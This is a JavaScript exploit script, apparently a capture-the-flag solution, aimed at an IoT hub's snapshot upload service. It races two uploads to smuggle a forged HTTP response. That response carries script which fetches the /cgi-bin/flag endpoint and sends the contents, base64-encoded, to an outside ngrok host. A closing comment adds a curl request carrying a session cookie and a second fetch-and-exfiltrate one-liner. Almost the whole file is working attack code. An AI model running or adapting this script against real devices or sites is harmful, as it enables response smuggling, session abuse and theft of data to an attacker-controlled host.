var net = require('net');
var crypto = require('crypto');

let token=`${process.env.SENSOR_TOKEN}\n`;
let filename='race\n';

let iframes = '<iframe src="http://iot.hub/data/snapshot/race?cacheBust=${id}"></iframe><img src="http://3a42e4d82a22.ngrok.io/iframes-loading" />';
for(let i = 0; i < 300; i++) {
  const id = crypto.randomBytes(32).toString('hex');
  iframes += `<iframe src="http://iot.hub/data/snapshot/race?cacheBust=${id}"></iframe>`;
}

let payloadJS = `<html><body>WIN!<script>fetch('http://iot.hub/cgi-bin/flag').then(r=>r.text()).then(f=>document.firstElementChild.innerHTML='<img src=http://3a42e4d82a22.ngrok.io/b64/'+ btoa(f)+'>');</script></body></html>`;

let payloadA = '';
while(payloadA.length <= 1447) {
  payloadA += 'A';
}
let shortPayload = payloadA;
let longPayload = shortPayload + `\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: ${payloadJS.length}\r\n\r\n${payloadJS}`

let short = true;

var client = new net.Socket();

let lastTime = Date.now();

let sendPayload = () => {
  if (short) {
    client.write(filename);
    client.write(shortPayload.length + '\n');
    client.write(shortPayload);
  } else {
    client.write(filename);
    client.write(longPayload.length + '\n');
    client.write(longPayload);
  }
  short = !short;
  console.log('Time between payloads: ${}')
};

client.connect(parseInt(process.env.SENSOR_PORT), process.env.TARGET_IP, function() {
	console.log('Connected');

  client.write(token);
  client.write('iframes\n');
  client.write(iframes.length + '\n');
  client.write(iframes);
});

client.on('data', function(data) {
	console.log('Received: ' + data);
  if (data.toString() === 'ok\n') {
    setTimeout(sendPayload, 0);
  }
});

client.on('close', function() {
	console.log('Connection closed');
});

/*
curl 'http://172.18.0.2/data/snapshot/race' -H 'Connection: keep-alive' -H 'Cookie: -goahead-session-=::webs.session::b48551c3e7a0185515e39a499024a4dc'

fetch('iot.hub/cgi-bin/flag').then(r=>r.text()).then((f)=>fetch('your url' + btoa(f)))
*/